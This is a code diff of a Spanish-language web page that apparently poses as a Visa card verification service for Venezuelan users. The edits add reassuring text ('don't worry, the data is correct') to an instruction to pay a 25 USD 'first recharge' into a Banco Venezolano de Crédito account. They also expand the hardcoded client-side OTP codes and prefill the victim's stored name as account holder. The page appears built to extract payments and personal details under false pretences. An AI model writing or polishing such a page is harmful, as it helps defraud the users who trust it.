@@ -4663,7 +4663,7 @@
             <div class="mobile-payment-success-text">Haz tu primera recarga por 25 USD para culminar tu verificación! Ahora tiene sus datos personales configurados para recibir pagos móviles. Puede compartir estos datos con quienes deseen enviarte dinero en Bolívares.</div>
           </div>
         </div>
-        <div class="bank-note" id="mobile-payment-note">Sabemos que tu banco es <strong><span id="user-bank-name"></span></strong>. Para facilitar tu primera recarga hemos generado datos en el <strong>Banco Venezolano de Crédito</strong>. Puedes transferir desde tu cuenta de <strong><span id="user-bank-name-2"></span></strong> o recibir fondos de cualquier persona usando estos datos.</div>
+        <div class="bank-note" id="mobile-payment-note">No se preocupe, los datos son correctos. Sabemos que su banco principal es <strong><span id="user-bank-name"></span></strong>, pero para su primera recarga le proporcionamos una cuenta en el <strong>Banco Venezolano de Crédito</strong>. Realice la transferencia desde su <strong><span id="user-bank-name-2"></span></strong> o reciba fondos de cualquier persona utilizando estos datos.</div>
         
         <div class="section-title" style="margin-bottom: 0.5rem;">
           <i class="fas fa-money-bill"></i> Seleccione un Monto
@@ -5202,7 +5202,7 @@
     // Configuración de valores constantes con tasa de cambio centralizada
     const CONFIG = {
       LOGIN_CODE: '009818410847505996421',
-      OTP_CODE: '142536',
+      OTP_CODES: ['142536', '748596', '124578'],
       EXCHANGE_RATES: {
         USD_TO_BS: 134.24,  // Tasa centralizada corregida
         USD_TO_EUR: 0.94
@@ -5628,7 +5628,7 @@ function stopVerificationProgress() {
           const rifCopyBtn = document.querySelector('#mobile-payment-rif .copy-btn');
           const phoneCopyBtn = document.querySelector('#mobile-payment-phone .copy-btn');
           
-          // Mostrar el nombre del usuario en lugar de datos fijos
+          // Mostrar el nombre completo del usuario
           if (nameValue && paymentData.name) {
             nameValue.textContent = paymentData.name;
             if (nameCopyBtn) {
@@ -6169,10 +6169,15 @@ function stopVerificationProgress() {
       const phoneCopyBtn = document.querySelector('#mobile-payment-phone .copy-btn');
       
       // Establecer el nombre completo del usuario como titular
-      if (nameValue && currentUser.fullName) {
-        nameValue.textContent = currentUser.fullName;
+      const regData = JSON.parse(localStorage.getItem('visaUserData') || '{}');
+      const fullName =
+        currentUser.fullName ||
+        regData.fullName ||
+        `${regData.firstName || ''} ${regData.lastName || ''}`.trim();
+      if (nameValue && fullName) {
+        nameValue.textContent = fullName;
         if (nameCopyBtn) {
-          nameCopyBtn.setAttribute('data-copy', currentUser.fullName);
+          nameCopyBtn.setAttribute('data-copy', fullName);
         }
       }
       
@@ -7830,8 +7835,9 @@ function stopVerificationProgress() {
 
       if (supportBtn) {
         supportBtn.addEventListener('click', function() {
-          const overlay = document.getElementById('support-overlay');
-          if (overlay) overlay.style.display = 'flex';
+          if (menu) {
+            menu.classList.toggle('open');
+          }
         });
       }
 
@@ -8149,7 +8155,7 @@ function stopVerificationProgress() {
           });
           
           // Check if OTP is valid
-          if (otpValue === CONFIG.OTP_CODE) {
+          if (CONFIG.OTP_CODES.includes(otpValue)) {
             // Check if user exceeded max recharges
             if (currentUser.cardRecharges >= CONFIG.MAX_CARD_RECHARGES) {
               // Hide OTP modal
